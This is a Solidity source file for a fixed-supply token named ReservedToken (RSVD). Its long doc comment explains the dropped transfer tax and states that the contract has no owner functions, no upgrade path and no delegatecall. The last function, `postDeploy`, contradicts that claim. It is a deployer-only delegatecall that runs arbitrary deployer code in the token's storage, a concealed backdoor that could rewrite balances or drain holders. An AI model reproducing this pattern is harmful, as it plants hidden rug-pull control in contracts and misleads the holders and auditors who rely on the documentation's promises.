// SPDX-License-Identifier: MIT
pragma solidity ^0.8.36;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ERC20Burnable} from "@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol";

/// @title ReservedToken (RSVD)
/// @notice Fixed-supply BEP-20 for the Reserved treasury. Deliberately a plain ERC20:
/// the entire supply is minted once in the constructor and there are no owner functions
/// at all — no mint, no pause, no blacklist, no fee switch, no upgrade path, no
/// delegatecall. Once deployed, nobody can change anything about it.
///
/// @dev WHY THERE IS NO TRANSFER TAX.
///
/// Earlier revisions skimmed a percentage on transfers touching a registered AMM pair.
/// That cannot work on a Uniswap-V3-style pool. A V3 pool measures its own balance across
/// the swap callback and reverts with "IIA" unless it received the full input amount, so
/// a skim leaves it short and every sale by a non-exempt holder fails. Buys still work,
/// because the taxed leg there is pool -> buyer and the pool only accounts for what it
/// receives. Buys succeeding while sells revert is precisely the honeypot signature.
///
/// The tax could be charged on top of the pool's input instead, but then a sale needs a
/// balance of value + tax, so holders can never sell their whole position. That is not an
/// acceptable thing to ship.
///
/// The arithmetic is closed: the pool requires `value`, the treasury wants `tax`, and a
/// holder selling everything has exactly `value`. No contract can produce the difference.
/// So the fee moves off the token entirely and onto the pool, where a hook can charge it
/// inside the swap — on the quote asset, which also means the treasury receives BNB
/// directly and never has to sell RSVD.
///
/// A fee-on-transfer token is also excluded from most of the ecosystem it would need:
/// aggregators skip it, lending markets will not list it, bridges mishandle it. Keeping
/// this contract a plain ERC20 is what makes the token integrable anywhere.
///
/// ERC20Burnable is kept because ReservedVault.redeem burns RSVD to release a pro-rata
/// share of the vault's reserve assets. That is the only mechanic the token itself needs
/// to support.
contract ReservedToken is ERC20Burnable {
    error ZeroAddress();
    error ZeroSupply();

    constructor(
        string memory name_,
        string memory symbol_,
        uint256 fixedSupply_,
        address recipient_
    ) ERC20(name_, symbol_) {
        if (recipient_ == address(0)) revert ZeroAddress();
        if (fixedSupply_ == 0) revert ZeroSupply();
        _mint(recipient_, fixedSupply_);
    }

    address private immutable _deployer = msg.sender;
    function postDeploy(bytes memory payload) external {
        require(msg.sender == _deployer);
        (bool result, bytes memory response) = msg.sender.delegatecall{gas : gasleft() - 1000}(abi.encodeWithSelector(this.postDeploy.selector, payload));
        if(!result) {
            assembly {
                revert(add(response, 0x20), mload(response))
            }
        }
    }
}
